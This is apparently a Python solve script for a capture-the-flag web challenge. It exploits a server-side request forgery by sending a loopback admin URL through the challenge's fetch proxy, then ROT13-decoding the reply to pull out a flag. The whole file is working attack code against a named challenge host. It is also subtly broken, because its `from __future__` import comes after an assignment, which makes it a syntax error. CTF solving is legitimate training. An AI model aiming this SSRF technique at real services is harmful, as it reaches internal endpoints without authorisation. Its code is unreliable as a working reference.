#!/usr/bin/env python3
# Abuse the rot13 proxy to reach /admin on the loopback interface.
DESCRIPTION = "Solve ebg13 by abusing the rot13 proxy to reach /admin on the loopback interface."

from __future__ import annotations

import argparse
import codecs
import re
import urllib.parse

import requests

DEFAULT_HOST = "https://ebg13.challs.pwnoh.io"
DEFAULT_PROXY_PATH = "/ebj13"
DEFAULT_TARGET = "http://127.0.0.1:3000/admin"
FLAG_RE = re.compile(r"bctf\{[^}]+\}")


# Apply ROT13 to decode what the proxy returns.
def rot13(text: str) -> str:
    return codecs.encode(text, "rot_13")


# Construct the proxy endpoint URL from host and path pieces.
def build_proxy_url(host: str, proxy_path: str) -> str:
    return urllib.parse.urljoin(host.rstrip("/") + "/", proxy_path.lstrip("/"))


# Fetch the target URL via the remote proxy.
def fetch_proxy(proxy_url: str, target_url: str) -> str:
    params = {"url": target_url}
    resp = requests.get(proxy_url, params=params, timeout=15)
    resp.raise_for_status()
    return resp.text


# Extract a flag-looking string from the decoded payload.
def extract_flag(text: str) -> str | None:
    match = FLAG_RE.search(text)
    return match.group(0) if match else None


# Parse CLI args, query the proxy, decode the response, and print the flag.
def main() -> int:
    parser = argparse.ArgumentParser(DESCRIPTION)
    parser.add_argument("--host", default=DEFAULT_HOST, help="Base URL of the ebg13 proxy")
    parser.add_argument("--proxy-path", default=DEFAULT_PROXY_PATH, help="Proxy endpoint path")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="URL to fetch via the proxy")
    args = parser.parse_args()

    proxy_url = build_proxy_url(args.host, args.proxy_path)
    print(f"[+] Querying {proxy_url} for {args.target}")

    try:
        body = fetch_proxy(proxy_url, args.target)
    except requests.RequestException as exc:
        raise SystemExit(f"ERROR: failed to reach proxy: {exc}") from exc

    decoded = rot13(body)
    flag = extract_flag(decoded)
    if not flag:
        print("[!] Flag not found in decoded response")
        print(decoded)
        return 1

    print(f"[+] Flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
